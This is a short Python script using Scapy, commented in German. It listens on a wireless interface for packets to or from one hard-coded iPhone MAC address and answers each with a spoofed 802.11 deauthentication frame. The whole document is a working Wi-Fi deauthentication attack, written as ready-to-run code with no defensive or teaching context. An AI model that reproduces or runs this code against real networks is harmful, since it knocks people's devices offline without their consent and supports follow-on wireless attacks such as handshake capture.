from scapy.all import *
import sys

from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth

# MAC-Adresse des iPhones
iphone_mac = "0E:EE:D0:2C:4C:C2"


# Funktion zum Verarbeiten der erfassten Pakete
def packet_callback(packet):
    if packet.haslayer(Dot11):
        if packet.addr2 == iphone_mac or packet.addr1 == iphone_mac:
            print(f"Packet from {iphone_mac} detected:")
            packet.show()
            send_response(packet)


# Funktion zum Senden einer Antwort
def send_response(packet):
    if packet.haslayer(Dot11):
        # Beispiel: Senden eines Deauthentication-Pakets an das iPhone
        dot11 = Dot11(type=0, subtype=12, addr1=packet.addr2, addr2=packet.addr1, addr3=packet.addr1)
        deauth = RadioTap() / dot11 / Dot11Deauth(reason=7)
        sendp(deauth, iface="WLAN", count=1, inter=0.1, verbose=1)
        print("Deauthentication packet sent to the iPhone")


# Erfassen von Paketen
sniff(prn=packet_callback, store=0)
